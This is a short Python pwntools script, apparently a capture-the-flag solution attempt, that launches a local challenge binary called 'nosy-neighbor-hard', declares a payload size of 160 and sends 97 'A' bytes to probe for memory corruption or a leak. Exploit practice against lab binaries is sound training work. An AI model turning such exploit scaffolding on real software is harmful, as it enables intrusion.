from pwn import *


p = process('/challenge/nosy-neighbor-hard')

output = p.recvuntil(b"Payload size:").decode()

p.sendline(b'160')

payload = b'A' * 97

p.recvuntil('Send your payload')

p.send(payload)

str = p.recvall(1)
print(str)
